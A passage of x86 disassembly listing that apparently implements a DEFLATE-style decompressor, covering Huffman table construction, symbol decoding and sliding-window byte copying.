  406b88:	0f 84 8b 06 00 00    	je     0x407219
  406b8e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406b91:	ff 4d cc             	decl   -0x34(%ebp)
  406b94:	8b cb                	mov    %ebx,%ecx
  406b96:	0f b6 00             	movzbl (%eax),%eax
  406b99:	d3 e0                	shl    %cl,%eax
  406b9b:	09 45 c0             	or     %eax,-0x40(%ebp)
  406b9e:	ff 45 c8             	incl   -0x38(%ebp)
  406ba1:	83 c3 08             	add    $0x8,%ebx
  406ba4:	83 fb 03             	cmp    $0x3,%ebx
  406ba7:	72 db                	jb     0x406b84
  406ba9:	8b 4e 08             	mov    0x8(%esi),%ecx
  406bac:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406baf:	83 e0 07             	and    $0x7,%eax
  406bb2:	83 eb 03             	sub    $0x3,%ebx
  406bb5:	0f be 89 d4 84 40 00 	movsbl 0x4084d4(%ecx),%ecx
  406bbc:	c1 6d c0 03          	shrl   $0x3,-0x40(%ebp)
  406bc0:	89 44 8e 0c          	mov    %eax,0xc(%esi,%ecx,4)
  406bc4:	8b 4e 04             	mov    0x4(%esi),%ecx
  406bc7:	ff 46 08             	incl   0x8(%esi)
  406bca:	8b 46 08             	mov    0x8(%esi),%eax
  406bcd:	c1 e9 0a             	shr    $0xa,%ecx
  406bd0:	83 c1 04             	add    $0x4,%ecx
  406bd3:	3b c1                	cmp    %ecx,%eax
  406bd5:	72 cd                	jb     0x406ba4
  406bd7:	eb 12                	jmp    0x406beb
  406bd9:	8b 46 08             	mov    0x8(%esi),%eax
  406bdc:	0f be 80 d4 84 40 00 	movsbl 0x4084d4(%eax),%eax
  406be3:	83 64 86 0c 00       	andl   $0x0,0xc(%esi,%eax,4)
  406be8:	ff 46 08             	incl   0x8(%esi)
  406beb:	83 7e 08 13          	cmpl   $0x13,0x8(%esi)
  406bef:	72 e8                	jb     0x406bd9
  406bf1:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  406bf4:	8d be 0c 05 00 00    	lea    0x50c(%esi),%edi
  406bfa:	51                   	push   %ecx
  406bfb:	8d 8e 20 05 00 00    	lea    0x520(%esi),%ecx
  406c01:	51                   	push   %ecx
  406c02:	8d 8e 10 05 00 00    	lea    0x510(%esi),%ecx
  406c08:	33 c0                	xor    %eax,%eax
  406c0a:	57                   	push   %edi
  406c0b:	51                   	push   %ecx
  406c0c:	50                   	push   %eax
  406c0d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406c10:	50                   	push   %eax
  406c11:	6a 13                	push   $0x13
  406c13:	8d 46 0c             	lea    0xc(%esi),%eax
  406c16:	6a 13                	push   $0x13
  406c18:	50                   	push   %eax
  406c19:	c7 07 07 00 00 00    	movl   $0x7,(%edi)
  406c1f:	e8 c8 06 00 00       	call   0x4072ec
  406c24:	85 c0                	test   %eax,%eax
  406c26:	75 12                	jne    0x406c3a
  406c28:	39 07                	cmp    %eax,(%edi)
  406c2a:	74 0e                	je     0x406c3a
  406c2c:	21 46 08             	and    %eax,0x8(%esi)
  406c2f:	c7 06 0d 00 00 00    	movl   $0xd,(%esi)
  406c35:	e9 1d 01 00 00       	jmp    0x406d57
  406c3a:	c7 06 11 00 00 00    	movl   $0x11,(%esi)
  406c40:	e9 c4 05 00 00       	jmp    0x407209
  406c45:	8b 86 0c 05 00 00    	mov    0x50c(%esi),%eax
  406c4b:	eb 20                	jmp    0x406c6d
  406c4d:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406c51:	0f 84 c2 05 00 00    	je     0x407219
  406c57:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406c5a:	ff 4d cc             	decl   -0x34(%ebp)
  406c5d:	0f b6 11             	movzbl (%ecx),%edx
  406c60:	8b cb                	mov    %ebx,%ecx
  406c62:	d3 e2                	shl    %cl,%edx
  406c64:	09 55 c0             	or     %edx,-0x40(%ebp)
  406c67:	ff 45 c8             	incl   -0x38(%ebp)
  406c6a:	83 c3 08             	add    $0x8,%ebx
  406c6d:	3b d8                	cmp    %eax,%ebx
  406c6f:	72 dc                	jb     0x406c4d
  406c71:	0f b7 04 45 a4 a5 40 	movzwl 0x40a5a4(,%eax,2),%eax
  406c78:	00 
  406c79:	23 45 c0             	and    -0x40(%ebp),%eax
  406c7c:	8b 8e 10 05 00 00    	mov    0x510(%esi),%ecx
  406c82:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  406c85:	0f b6 50 01          	movzbl 0x1(%eax),%edx
  406c89:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  406c8d:	83 f8 10             	cmp    $0x10,%eax
  406c90:	89 45 ec             	mov    %eax,-0x14(%ebp)
  406c93:	73 16                	jae    0x406cab
  406c95:	8b ca                	mov    %edx,%ecx
  406c97:	2b da                	sub    %edx,%ebx
  406c99:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406c9c:	8b 4e 08             	mov    0x8(%esi),%ecx
  406c9f:	89 44 8e 0c          	mov    %eax,0xc(%esi,%ecx,4)
  406ca3:	ff 46 08             	incl   0x8(%esi)
  406ca6:	e9 ac 00 00 00       	jmp    0x406d57
  406cab:	83 f8 12             	cmp    $0x12,%eax
  406cae:	75 0c                	jne    0x406cbc
  406cb0:	6a 07                	push   $0x7
  406cb2:	c7 45 f8 0b 00 00 00 	movl   $0xb,-0x8(%ebp)
  406cb9:	58                   	pop    %eax
  406cba:	eb 2c                	jmp    0x406ce8
  406cbc:	83 c0 f2             	add    $0xfffffff2,%eax
  406cbf:	c7 45 f8 03 00 00 00 	movl   $0x3,-0x8(%ebp)
  406cc6:	eb 20                	jmp    0x406ce8
  406cc8:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406ccc:	0f 84 47 05 00 00    	je     0x407219
  406cd2:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406cd5:	ff 4d cc             	decl   -0x34(%ebp)
  406cd8:	0f b6 39             	movzbl (%ecx),%edi
  406cdb:	8b cb                	mov    %ebx,%ecx
  406cdd:	d3 e7                	shl    %cl,%edi
  406cdf:	09 7d c0             	or     %edi,-0x40(%ebp)
  406ce2:	ff 45 c8             	incl   -0x38(%ebp)
  406ce5:	83 c3 08             	add    $0x8,%ebx
  406ce8:	8d 0c 10             	lea    (%eax,%edx,1),%ecx
  406ceb:	3b d9                	cmp    %ecx,%ebx
  406ced:	72 d9                	jb     0x406cc8
  406cef:	8b ca                	mov    %edx,%ecx
  406cf1:	2b da                	sub    %edx,%ebx
  406cf3:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406cf6:	0f b7 0c 45 a4 a5 40 	movzwl 0x40a5a4(,%eax,2),%ecx
  406cfd:	00 
  406cfe:	23 4d c0             	and    -0x40(%ebp),%ecx
  406d01:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406d04:	2b d8                	sub    %eax,%ebx
  406d06:	03 d1                	add    %ecx,%edx
  406d08:	8b c8                	mov    %eax,%ecx
  406d0a:	8b 46 04             	mov    0x4(%esi),%eax
  406d0d:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406d10:	8b 4e 08             	mov    0x8(%esi),%ecx
  406d13:	8b f8                	mov    %eax,%edi
  406d15:	c1 ef 05             	shr    $0x5,%edi
  406d18:	83 e7 1f             	and    $0x1f,%edi
  406d1b:	83 e0 1f             	and    $0x1f,%eax
  406d1e:	8d 84 07 02 01 00 00 	lea    0x102(%edi,%eax,1),%eax
  406d25:	8d 3c 0a             	lea    (%edx,%ecx,1),%edi
  406d28:	3b f8                	cmp    %eax,%edi
  406d2a:	0f 87 7c fb ff ff    	ja     0x4068ac
  406d30:	83 7d ec 10          	cmpl   $0x10,-0x14(%ebp)
  406d34:	75 0f                	jne    0x406d45
  406d36:	83 f9 01             	cmp    $0x1,%ecx
  406d39:	0f 82 6d fb ff ff    	jb     0x4068ac
  406d3f:	8b 7c 8e 08          	mov    0x8(%esi,%ecx,4),%edi
  406d43:	eb 02                	jmp    0x406d47
  406d45:	33 ff                	xor    %edi,%edi
  406d47:	8d 44 8e 0c          	lea    0xc(%esi,%ecx,4),%eax
  406d4b:	89 38                	mov    %edi,(%eax)
  406d4d:	41                   	inc    %ecx
  406d4e:	83 c0 04             	add    $0x4,%eax
  406d51:	4a                   	dec    %edx
  406d52:	75 f7                	jne    0x406d4b
  406d54:	89 4e 08             	mov    %ecx,0x8(%esi)
  406d57:	8b 46 04             	mov    0x4(%esi),%eax
  406d5a:	8b 4e 08             	mov    0x8(%esi),%ecx
  406d5d:	8b d0                	mov    %eax,%edx
  406d5f:	83 e0 1f             	and    $0x1f,%eax
  406d62:	c1 ea 05             	shr    $0x5,%edx
  406d65:	83 e2 1f             	and    $0x1f,%edx
  406d68:	8d 84 02 02 01 00 00 	lea    0x102(%edx,%eax,1),%eax
  406d6f:	3b c8                	cmp    %eax,%ecx
  406d71:	0f 82 ce fe ff ff    	jb     0x406c45
  406d77:	8b 46 04             	mov    0x4(%esi),%eax
  406d7a:	83 a6 10 05 00 00 00 	andl   $0x0,0x510(%esi)
  406d81:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  406d85:	8b f8                	mov    %eax,%edi
  406d87:	c1 e8 05             	shr    $0x5,%eax
  406d8a:	83 e7 1f             	and    $0x1f,%edi
  406d8d:	b9 01 01 00 00       	mov    $0x101,%ecx
  406d92:	83 e0 1f             	and    $0x1f,%eax
  406d95:	03 f9                	add    %ecx,%edi
  406d97:	40                   	inc    %eax
  406d98:	8d 55 f4             	lea    -0xc(%ebp),%edx
  406d9b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  406d9e:	8d 86 20 05 00 00    	lea    0x520(%esi),%eax
  406da4:	52                   	push   %edx
  406da5:	50                   	push   %eax
  406da6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406da9:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  406db0:	50                   	push   %eax
  406db1:	8d 45 e8             	lea    -0x18(%ebp),%eax
  406db4:	50                   	push   %eax
  406db5:	68 28 85 40 00       	push   $0x408528
  406dba:	68 e8 84 40 00       	push   $0x4084e8
  406dbf:	51                   	push   %ecx
  406dc0:	8d 46 0c             	lea    0xc(%esi),%eax
  406dc3:	57                   	push   %edi
  406dc4:	50                   	push   %eax
  406dc5:	c7 45 f0 06 00 00 00 	movl   $0x6,-0x10(%ebp)
  406dcc:	e8 1b 05 00 00       	call   0x4072ec
  406dd1:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406dd5:	75 03                	jne    0x406dda
  406dd7:	83 c8 ff             	or     $0xffffffff,%eax
  406dda:	85 c0                	test   %eax,%eax
  406ddc:	0f 85 ca fa ff ff    	jne    0x4068ac
  406de2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406de5:	50                   	push   %eax
  406de6:	8d 86 20 05 00 00    	lea    0x520(%esi),%eax
  406dec:	50                   	push   %eax
  406ded:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406df0:	50                   	push   %eax
  406df1:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406df4:	50                   	push   %eax
  406df5:	68 a4 85 40 00       	push   $0x4085a4
  406dfa:	68 68 85 40 00       	push   $0x408568
  406dff:	6a 00                	push   $0x0
  406e01:	ff 75 ec             	push   -0x14(%ebp)
  406e04:	8d 44 be 0c          	lea    0xc(%esi,%edi,4),%eax
  406e08:	50                   	push   %eax
  406e09:	e8 de 04 00 00       	call   0x4072ec
  406e0e:	85 c0                	test   %eax,%eax
  406e10:	0f 85 96 fa ff ff    	jne    0x4068ac
  406e16:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406e19:	85 c0                	test   %eax,%eax
  406e1b:	75 0c                	jne    0x406e29
  406e1d:	81 ff 01 01 00 00    	cmp    $0x101,%edi
  406e23:	0f 8f 83 fa ff ff    	jg     0x4068ac
  406e29:	8a 4d fc             	mov    -0x4(%ebp),%cl
  406e2c:	83 26 00             	andl   $0x0,(%esi)
  406e2f:	88 46 11             	mov    %al,0x11(%esi)
  406e32:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406e35:	89 46 14             	mov    %eax,0x14(%esi)
  406e38:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406e3b:	88 4e 10             	mov    %cl,0x10(%esi)
  406e3e:	89 46 18             	mov    %eax,0x18(%esi)
  406e41:	0f b6 46 10          	movzbl 0x10(%esi),%eax
  406e45:	89 46 0c             	mov    %eax,0xc(%esi)
  406e48:	8b 46 14             	mov    0x14(%esi),%eax
  406e4b:	89 46 08             	mov    %eax,0x8(%esi)
  406e4e:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
  406e54:	8b 46 0c             	mov    0xc(%esi),%eax
  406e57:	eb 20                	jmp    0x406e79
  406e59:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406e5d:	0f 84 b6 03 00 00    	je     0x407219
  406e63:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406e66:	ff 4d cc             	decl   -0x34(%ebp)
  406e69:	0f b6 11             	movzbl (%ecx),%edx
  406e6c:	8b cb                	mov    %ebx,%ecx
  406e6e:	d3 e2                	shl    %cl,%edx
  406e70:	09 55 c0             	or     %edx,-0x40(%ebp)
  406e73:	ff 45 c8             	incl   -0x38(%ebp)
  406e76:	83 c3 08             	add    $0x8,%ebx
  406e79:	3b d8                	cmp    %eax,%ebx
  406e7b:	72 dc                	jb     0x406e59
  406e7d:	0f b7 04 45 a4 a5 40 	movzwl 0x40a5a4(,%eax,2),%eax
  406e84:	00 
  406e85:	23 45 c0             	and    -0x40(%ebp),%eax
  406e88:	8b 4e 08             	mov    0x8(%esi),%ecx
  406e8b:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  406e8e:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  406e92:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406e95:	2b d9                	sub    %ecx,%ebx
  406e97:	0f b6 08             	movzbl (%eax),%ecx
  406e9a:	85 c9                	test   %ecx,%ecx
  406e9c:	75 12                	jne    0x406eb0
  406e9e:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  406ea2:	89 46 08             	mov    %eax,0x8(%esi)
  406ea5:	c7 06 06 00 00 00    	movl   $0x6,(%esi)
  406eab:	e9 59 03 00 00       	jmp    0x407209
  406eb0:	f6 c1 10             	test   $0x10,%cl
  406eb3:	74 18                	je     0x406ecd
  406eb5:	83 e1 0f             	and    $0xf,%ecx
  406eb8:	89 4e 08             	mov    %ecx,0x8(%esi)
  406ebb:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  406ebf:	89 46 04             	mov    %eax,0x4(%esi)
  406ec2:	c7 06 02 00 00 00    	movl   $0x2,(%esi)
  406ec8:	e9 3c 03 00 00       	jmp    0x407209
  406ecd:	f6 c1 40             	test   $0x40,%cl
  406ed0:	0f 84 d1 00 00 00    	je     0x406fa7
  406ed6:	f6 c1 20             	test   $0x20,%cl
  406ed9:	0f 84 cd f9 ff ff    	je     0x4068ac
  406edf:	c7 06 07 00 00 00    	movl   $0x7,(%esi)
  406ee5:	e9 1f 03 00 00       	jmp    0x407209
  406eea:	8b 46 08             	mov    0x8(%esi),%eax
  406eed:	eb 20                	jmp    0x406f0f
  406eef:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406ef3:	0f 84 20 03 00 00    	je     0x407219
  406ef9:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406efc:	ff 4d cc             	decl   -0x34(%ebp)
  406eff:	0f b6 11             	movzbl (%ecx),%edx
  406f02:	8b cb                	mov    %ebx,%ecx
  406f04:	d3 e2                	shl    %cl,%edx
  406f06:	09 55 c0             	or     %edx,-0x40(%ebp)
  406f09:	ff 45 c8             	incl   -0x38(%ebp)
  406f0c:	83 c3 08             	add    $0x8,%ebx
  406f0f:	3b d8                	cmp    %eax,%ebx
  406f11:	72 dc                	jb     0x406eef
  406f13:	0f b7 0c 45 a4 a5 40 	movzwl 0x40a5a4(,%eax,2),%ecx
  406f1a:	00 
  406f1b:	23 4d c0             	and    -0x40(%ebp),%ecx
  406f1e:	01 4e 04             	add    %ecx,0x4(%esi)
  406f21:	8b c8                	mov    %eax,%ecx
  406f23:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406f26:	2b d8                	sub    %eax,%ebx
  406f28:	0f b6 46 11          	movzbl 0x11(%esi),%eax
  406f2c:	89 46 0c             	mov    %eax,0xc(%esi)
  406f2f:	8b 46 18             	mov    0x18(%esi),%eax
  406f32:	89 46 08             	mov    %eax,0x8(%esi)
  406f35:	c7 06 03 00 00 00    	movl   $0x3,(%esi)
  406f3b:	8b 46 0c             	mov    0xc(%esi),%eax
  406f3e:	eb 20                	jmp    0x406f60
  406f40:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406f44:	0f 84 cf 02 00 00    	je     0x407219
  406f4a:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406f4d:	ff 4d cc             	decl   -0x34(%ebp)
  406f50:	0f b6 11             	movzbl (%ecx),%edx
  406f53:	8b cb                	mov    %ebx,%ecx
  406f55:	d3 e2                	shl    %cl,%edx
  406f57:	09 55 c0             	or     %edx,-0x40(%ebp)
  406f5a:	ff 45 c8             	incl   -0x38(%ebp)
  406f5d:	83 c3 08             	add    $0x8,%ebx
  406f60:	3b d8                	cmp    %eax,%ebx
  406f62:	72 dc                	jb     0x406f40
  406f64:	0f b7 04 45 a4 a5 40 	movzwl 0x40a5a4(,%eax,2),%eax
  406f6b:	00 
  406f6c:	23 45 c0             	and    -0x40(%ebp),%eax
  406f6f:	8b 4e 08             	mov    0x8(%esi),%ecx
  406f72:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  406f75:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  406f79:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406f7c:	2b d9                	sub    %ecx,%ebx
  406f7e:	0f b6 08             	movzbl (%eax),%ecx
  406f81:	f6 c1 10             	test   $0x10,%cl
  406f84:	74 18                	je     0x406f9e
  406f86:	83 e1 0f             	and    $0xf,%ecx
  406f89:	89 4e 08             	mov    %ecx,0x8(%esi)
  406f8c:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  406f90:	89 46 0c             	mov    %eax,0xc(%esi)
  406f93:	c7 06 04 00 00 00    	movl   $0x4,(%esi)
  406f99:	e9 6b 02 00 00       	jmp    0x407209
  406f9e:	f6 c1 40             	test   $0x40,%cl
  406fa1:	0f 85 05 f9 ff ff    	jne    0x4068ac
  406fa7:	89 4e 0c             	mov    %ecx,0xc(%esi)
  406faa:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  406fae:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  406fb1:	89 46 08             	mov    %eax,0x8(%esi)
  406fb4:	e9 50 02 00 00       	jmp    0x407209
  406fb9:	8b 46 08             	mov    0x8(%esi),%eax
  406fbc:	eb 20                	jmp    0x406fde
  406fbe:	83 7d cc 00          	cmpl   $0x0,-0x34(%ebp)
  406fc2:	0f 84 51 02 00 00    	je     0x407219
  406fc8:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406fcb:	ff 4d cc             	decl   -0x34(%ebp)
  406fce:	0f b6 11             	movzbl (%ecx),%edx
  406fd1:	8b cb                	mov    %ebx,%ecx
  406fd3:	d3 e2                	shl    %cl,%edx
  406fd5:	09 55 c0             	or     %edx,-0x40(%ebp)
  406fd8:	ff 45 c8             	incl   -0x38(%ebp)
  406fdb:	83 c3 08             	add    $0x8,%ebx
  406fde:	3b d8                	cmp    %eax,%ebx
  406fe0:	72 dc                	jb     0x406fbe
  406fe2:	0f b7 0c 45 a4 a5 40 	movzwl 0x40a5a4(,%eax,2),%ecx
  406fe9:	00 
  406fea:	23 4d c0             	and    -0x40(%ebp),%ecx
  406fed:	01 4e 0c             	add    %ecx,0xc(%esi)
  406ff0:	8b c8                	mov    %eax,%ecx
  406ff2:	d3 6d c0             	shrl   %cl,-0x40(%ebp)
  406ff5:	2b d8                	sub    %eax,%ebx
  406ff7:	c7 06 05 00 00 00    	movl   $0x5,(%esi)
  406ffd:	8b 45 d0             	mov    -0x30(%ebp),%eax
  407000:	8b 56 0c             	mov    0xc(%esi),%edx
  407003:	8b c8                	mov    %eax,%ecx
  407005:	2b ce                	sub    %esi,%ecx
  407007:	81 e9 a0 1b 00 00    	sub    $0x1ba0,%ecx
  40700d:	3b ca                	cmp    %edx,%ecx
  40700f:	73 13                	jae    0x407024
  407011:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  407017:	2b ca                	sub    %edx,%ecx
  407019:	2b ce                	sub    %esi,%ecx
  40701b:	8d 8c 01 60 e4 ff ff 	lea    -0x1ba0(%ecx,%eax,1),%ecx
  407022:	eb 04                	jmp    0x407028
  407024:	8b c8                	mov    %eax,%ecx
  407026:	2b ca                	sub    %edx,%ecx
  407028:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  40702c:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40702f:	0f 84 90 f9 ff ff    	je     0x4069c5
  407035:	8b 7d d4             	mov    -0x2c(%ebp),%edi
  407038:	85 ff                	test   %edi,%edi
  40703a:	0f 85 91 00 00 00    	jne    0x4070d1
  407040:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  407046:	3b c7                	cmp    %edi,%eax
  407048:	75 23                	jne    0x40706d
  40704a:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  407050:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  407056:	3b ca                	cmp    %edx,%ecx
  407058:	74 13                	je     0x40706d
  40705a:	8b c2                	mov    %edx,%eax
  40705c:	3b c1                	cmp    %ecx,%eax
  40705e:	73 07                	jae    0x407067
  407060:	2b c8                	sub    %eax,%ecx
  407062:	49                   	dec    %ecx
  407063:	8b f9                	mov    %ecx,%edi
  407065:	eb 02                	jmp    0x407069
  407067:	2b f8                	sub    %eax,%edi
  407069:	85 ff                	test   %edi,%edi
  40706b:	75 64                	jne    0x4070d1
  40706d:	ff 75 08             	push   0x8(%ebp)
  407070:	89 86 a8 9b 00 00    	mov    %eax,0x9ba8(%esi)
  407076:	e8 09 02 00 00       	call   0x407284
  40707b:	8b 86 a8 9b 00 00    	mov    0x9ba8(%esi),%eax
  407081:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  407087:	3b c1                	cmp    %ecx,%eax
  407089:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40708c:	73 07                	jae    0x407095
  40708e:	8b f9                	mov    %ecx,%edi
  407090:	2b f8                	sub    %eax,%edi
  407092:	4f                   	dec    %edi
  407093:	eb 08                	jmp    0x40709d
  407095:	8b be a0 9b 00 00    	mov    0x9ba0(%esi),%edi
  40709b:	2b f8                	sub    %eax,%edi
  40709d:	8b 96 a0 9b 00 00    	mov    0x9ba0(%esi),%edx
  4070a3:	3b c2                	cmp    %edx,%eax
  4070a5:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4070a8:	75 1f                	jne    0x4070c9
  4070aa:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  4070b0:	3b ca                	cmp    %edx,%ecx
  4070b2:	74 15                	je     0x4070c9
  4070b4:	8b c2                	mov    %edx,%eax
  4070b6:	3b c1                	cmp    %ecx,%eax
  4070b8:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4070bb:	73 07                	jae    0x4070c4
  4070bd:	2b c8                	sub    %eax,%ecx
  4070bf:	49                   	dec    %ecx
  4070c0:	8b f9                	mov    %ecx,%edi
  4070c2:	eb 05                	jmp    0x4070c9
  4070c4:	8b 7d f8             	mov    -0x8(%ebp),%edi
  4070c7:	2b f8                	sub    %eax,%edi
  4070c9:	85 ff                	test   %edi,%edi
  4070cb:	0f 84 64 01 00 00    	je     0x407235
  4070d1:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4070d4:	8a 11                	mov    (%ecx),%dl
  4070d6:	88 10                	mov    %dl,(%eax)
  4070d8:	40                   	inc    %eax
  4070d9:	41                   	inc    %ecx
  4070da:	4f                   	dec    %edi
  4070db:	3b 8e a0 9b 00 00    	cmp    0x9ba0(%esi),%ecx
  4070e1:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4070e4:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4070e7:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  4070ea:	75 09                	jne    0x4070f5
  4070ec:	8d 8e a0 1b 00 00    	lea    0x1ba0(%esi),%ecx
  4070f2:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4070f5:	ff 4e 04             	decl   0x4(%esi)
  4070f8:	0f 85 3a ff ff ff    	jne    0x407038
  4070fe:	e9 c2 f8 ff ff       	jmp    0x4069c5
  407103:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407106:	8b 7d d0             	mov    -0x30(%ebp),%edi
  407109:	85 c0                	test   %eax,%eax
  40710b:	0f 85 91 00 00 00    	jne    0x4071a2
  407111:	8b 8e a0 9b 00 00    	mov    0x9ba0(%esi),%ecx
  407117:	3b f9                	cmp    %ecx,%edi
  407119:	75 23                	jne    0x40713e
  40711b:	8b 86 a4 9b 00 00    	mov    0x9ba4(%esi),%eax
  407121:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  407127:	3b c2                	cmp    %edx,%eax
  407129:	74 13                	je     0x40713e
  40712b:	8b fa                	mov    %edx,%edi
  40712d:	3b f8                	cmp    %eax,%edi
  40712f:	73 05                	jae    0x407136
  407131:	2b c7                	sub    %edi,%eax
  407133:	48                   	dec    %eax
  407134:	eb 04                	jmp    0x40713a
  407136:	2b cf                	sub    %edi,%ecx
  407138:	8b c1                	mov    %ecx,%eax
  40713a:	85 c0                	test   %eax,%eax
  40713c:	75 64                	jne    0x4071a2
  40713e:	ff 75 08             	push   0x8(%ebp)
  407141:	89 be a8 9b 00 00    	mov    %edi,0x9ba8(%esi)
  407147:	e8 38 01 00 00       	call   0x407284
  40714c:	8b be a8 9b 00 00    	mov    0x9ba8(%esi),%edi
  407152:	8b 8e a4 9b 00 00    	mov    0x9ba4(%esi),%ecx
  407158:	3b f9                	cmp    %ecx,%edi
  40715a:	89 7d d0             	mov    %edi,-0x30(%ebp)
  40715d:	73 07                	jae    0x407166
  40715f:	8b c1                	mov    %ecx,%eax
  407161:	2b c7                	sub    %edi,%eax
  407163:	48                   	dec    %eax
  407164:	eb 08                	jmp    0x40716e
  407166:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  40716c:	2b c7                	sub    %edi,%eax
  40716e:	8b 96 a0 9b 00 00    	mov    0x9ba0(%esi),%edx
  407174:	3b fa                	cmp    %edx,%edi
  407176:	89 55 f8             	mov    %edx,-0x8(%ebp)
  407179:	75 1f                	jne    0x40719a
  40717b:	8d 96 a0 1b 00 00    	lea    0x1ba0(%esi),%edx
  407181:	3b ca                	cmp    %edx,%ecx
  407183:	74 15                	je     0x40719a
  407185:	8b fa                	mov    %edx,%edi
  407187:	3b f9                	cmp    %ecx,%edi
  407189:	89 7d d0             	mov    %edi,-0x30(%ebp)
  40718c:	73 07                	jae    0x407195
  40718e:	2b cf                	sub    %edi,%ecx
  407190:	49                   	dec    %ecx
  407191:	8b c1                	mov    %ecx,%eax
  407193:	eb 05                	jmp    0x40719a
  407195:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407198:	2b c7                	sub    %edi,%eax
  40719a:	85 c0                	test   %eax,%eax
  40719c:	0f 84 93 00 00 00    	je     0x407235
  4071a2:	8a 4e 08             	mov    0x8(%esi),%cl
  4071a5:	88 0f                	mov    %cl,(%edi)
  4071a7:	47                   	inc    %edi
  4071a8:	48                   	dec    %eax
  4071a9:	89 7d d0             	mov    %edi,-0x30(%ebp)
  4071ac:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4071af:	e9 11 f8 ff ff       	jmp    0x4069c5
  4071b4:	83 fb 07             	cmp    $0x7,%ebx
  4071b7:	76 09                	jbe    0x4071c2
  4071b9:	83 eb 08             	sub    $0x8,%ebx
  4071bc:	ff 45 cc             	incl   -0x34(%ebp)
  4071bf:	ff 4d c8             	decl   -0x38(%ebp)
  4071c2:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4071c5:	ff 75 08             	push   0x8(%ebp)
  4071c8:	89 86 a8 9b 00 00    	mov    %eax,0x9ba8(%esi)
  4071ce:	e8 b1 00 00 00       	call   0x407284
  4071d3:	8b 8e a8 9b 00 00    	mov    0x9ba8(%esi),%ecx
  4071d9:	8b 96 a4 9b 00 00    	mov    0x9ba4(%esi),%edx
  4071df:	3b ca                	cmp    %edx,%ecx
  4071e1:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  4071e4:	73 07                	jae    0x4071ed
  4071e6:	8b c2                	mov    %edx,%eax
  4071e8:	2b c1                	sub    %ecx,%eax
  4071ea:	48                   	dec    %eax
  4071eb:	eb 08                	jmp    0x4071f5
  4071ed:	8b 86 a0 9b 00 00    	mov    0x9ba0(%esi),%eax
  4071f3:	2b c1                	sub    %ecx,%eax
  4071f5:	3b ca                	cmp    %edx,%ecx
  4071f7:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4071fa:	75 39                	jne    0x407235
  4071fc:	8b 86 14 05 00 00    	mov    0x514(%esi),%eax
  407202:	83 f8 08             	cmp    $0x8,%eax
  407205:	89 06                	mov    %eax,(%esi)
  407207:	75 33                	jne    0x40723c
  407209:	8b 06                	mov    (%esi),%eax
  40720b:	83 f8 0f             	cmp    $0xf,%eax
  40720e:	0f 86 32 f6 ff ff    	jbe    0x406846
  407214:	e9 93 f6 ff ff       	jmp    0x4068ac
  407219:	8b 45 c0             	mov    -0x40(%ebp),%eax
